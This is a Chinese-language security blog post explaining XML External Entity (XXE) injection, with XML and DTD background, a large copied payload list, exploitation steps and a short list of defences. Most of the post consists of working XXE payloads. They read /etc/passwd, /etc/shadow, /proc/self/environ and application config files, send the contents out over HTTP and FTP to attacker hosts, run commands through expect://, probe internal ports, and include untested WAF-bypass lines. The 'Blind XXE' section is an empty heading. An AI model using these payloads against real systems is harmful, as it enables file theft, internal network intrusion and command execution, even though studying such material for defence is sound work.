---
title: XXE 成因分析与应用
date: 2019-12-16 11:12:37
tags: [XXE]
categories: [Network Security]
---

### xxe简介

XML External Entity Injection，xml外部实体注入漏洞

 当允许引用外部实体时，通过构造恶意内容可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。

### 可能的场景

很多的网站都会对xml文件进行解析，解析的时候都有可能出现可用的XXE漏洞，从而被攻击利用，攻击的方法基于实体中可以使用的协议。

像XML文件作为配置文件的系统（spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）,soap通信通信格式，甚至有道题目的参数为Yiruma处理中也涉及到了对xml文件的解析，此外，网上有一些在线XML格式化工具，还有一ctf题目中的将csv文件转化为xml文件的功能，都可能涉及到不安全的XML文件解析从而存在攻击点。

### XXE的成因分析

产生原因是XML文档结构和DTD文档类型定义漏洞，参数过滤不严

#### xml文档结构

 XML文档有三个部分： 

```xml
<!--第一部分：XML申明-->
<?xml version="1.0"?> 
<!--第二部分：文档类型定义-->
<!DOCTYPE note [  <!--定义此文档是 note 类型的文档-->
<!ELEMENT note (to,from,heading,body)>  <!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)>     <!--定义to元素为”#PCDATA”类型-->
<!ELEMENT from (#PCDATA)>   <!--定义from元素为”#PCDATA”类型-->
<!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)>   <!--定义body元素为”#PCDATA”类型-->
]>
<!--第三部分：文档元素-->
<note>
<to>Dave</to>
<from>Tom</from>
<head>Reminder</head>
<body>You are a good man</body>
</note>
```

 第二部分就是xml文档的DTD部分，也是攻击的产生点。 

### XXE Payloads

```xml
--------------------------------------------------------------
Vanilla, used to verify outbound xxe or blind xxe
--------------------------------------------------------------
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt">
]>
<r>&sp;</r>

---------------------------------------------------------------
OoB extraction
---------------------------------------------------------------
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

## External dtd: ##

<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">

----------------------------------------------------------------
OoB variation of above (seems to work better against .NET)
----------------------------------------------------------------
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
%sp;
%param1;
%exfil;
]>

## External dtd: ##

<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">

---------------------------------------------------------------
OoB extraction
---------------------------------------------------------------
<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % data3 SYSTEM "file:///etc/shadow">
<!ENTITY % sp SYSTEM "http://EvilHost:port/sp.dtd">
%sp;
%param3;
%exfil;
]>

## External dtd: ##
<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://Evilhost:port/%data3;'>">

-----------------------------------------------------------------------
OoB extra ERROR -- Java
-----------------------------------------------------------------------
<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % data3 SYSTEM "file:///etc/passwd">
<!ENTITY % sp SYSTEM "http://x.x.x.x:8080/ss5.dtd">
%sp;
%param3;
%exfil;
]>
<r></r>
## External dtd: ##

<!ENTITY % param1 '<!ENTITY &#x25; external SYSTEM "file:///nothere/%payload;">'> %param1; %external;


-----------------------------------------------------------------------
OoB extra nice
-----------------------------------------------------------------------
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % stuff SYSTEM "file:///usr/local/tomcat/webapps/customapp/WEB-INF/applicationContext.xml ">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://evil/evil.xml">
%dtd;
]>
<root>&all;</root>
 
## External dtd: ##
<!ENTITY all "%start;%stuff;%end;">

------------------------------------------------------------------
File-not-found exception based extraction
------------------------------------------------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [  
  <!ENTITY % one SYSTEM "http://attacker.tld/dtd-part" >
  %one;
  %two;
  %four;
]>

## External dtd: ##

<!ENTITY % three SYSTEM "file:///etc/passwd">
<!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">

-------------------------^ you might need to encode this % (depends on your target) as: &#x25;

--------------
FTP
--------------
<?xml version="1.0" ?>
<!DOCTYPE a [ 
<!ENTITY % asd SYSTEM "http://x.x.x.x:4444/ext.dtd">
%asd;
%c;
]>
<a>&rrr;</a>


## External dtd ##
<!ENTITY % d SYSTEM "file:///proc/self/environ">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">

---------------------------
Inside SOAP body
---------------------------
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>


---------------------------
Untested - WAF Bypass
---------------------------
<!DOCTYPE :. SYTEM "http://"
<!DOCTYPE :_-_: SYTEM "http://"
<!DOCTYPE {0xdfbf} SYSTEM "http://"
```



#### DTD文档类型定

1） **DTD内部、外部声明** 

```
内部DTD：
假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：
<!DOCTYPE root-element [element-declarations]>

外部DTD：
假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：
<!DOCTYPE root-element SYSTEM “filename”>
解析时会调用外部DTD文件filename
```

2）  **DTD参数实体、非参数实体** 

除了外部和内部的声明之外，DTD的实体还有参数和非参数之分。

其中参数实体只能在DTD内部(XML的第二部分)以`%实体名`的方式引用，而非参数实体则可在XML文档元素，也就是XML的第三个部分以`&实体名`的方式引用

举例：

```xml
这是一个内部实体+非参数实体，参数在XML文档文档元素部分引用，不能使用协议
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY name "nMask">
]>
<foo>
        <value>&name;</value> 
</foo>
```

```xml
这是一个外部实体+参数实体，参数在XML文档DTD内部引用，可以使用外部协议
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY % name SYSTEM "file:///etc/passwd">
    %name;
]>
```

### XXE利用方式

 使用hackbar post构造的xml文档，或者burpsuite抓包进行post 

#### A) 有回显的注入

##### 1）任意文件读取

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY file SYSTEM "file:///etc/passwd">]>
<foo>
        <value>&file;</value> 
</foo>
```

##### 2）命令执行

在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<root>
<name>&xxe;</name>
</root>
```

##### 3）内网端口探测

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "http://127.0.0.1:80" >]>
<root>
<name>&xxe;</name>
</root>
```

可以对80端口进行探测，一般会探测比较常用的端口。

##### 4）攻击内网网站

结合网站框架本身的漏洞，如struts2

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "http://127.0.0.1:80/payload" >]>
<root>
<name>&xxe;</name>
</root>
```

##### 5）过滤了ENTITY关键字

DTD文档支持这么一种定义，直接在定义文档类型的时候引入外部DTD文档，也就是在xml文档的第三部分使用ENTITY，所以在DTD文档类型定义中过滤了ENTITY的情况下，同样可以实现以上的四种方法。

```xml
<!DOCTYPE svg SYSTEM "http://118.89.16.36/evil.dtd">   #????  test?  svg?
<root>&test;</root>
evil.dtd
<!ENTITY test SYSTEM "file:///etc/passwd">
```

可以看到在文档内容的部分使用了恶意的代码构造。

##### 6）行不通的方法

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY %param1 "file:///c:/1.txt">
<!ENTITY %param2 "http://127.0.0.1/?payload=%param1">
%param2;
]>
```

这样看起来可以读取系统文件内容来作为payload，是个可用的方法。
但是这样做行不通，原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。

#### B) 无回显的XXE漏洞—Blind XXE



### xxe防御

1. 使用开发语言提供的禁用外部实体的方法;
2. 过滤用户提交的XML数据;
   1. 检查所使用的底层xml解析库，默认禁止外部实体的解析
   2. 使用第三方应用代码及时升级补丁



参考：

[xxe payload]( https://gist.github.com/staaldraad/01415b990939494879b4#file-xxe_payloads )

[xxe 入门]( https://blog.csdn.net/zz_Caleb/article/details/90900214 )

[XXE Explanation and Exploitation]( https://www.exploit-db.com/docs/45374 ): VulnHub -- XXE 1


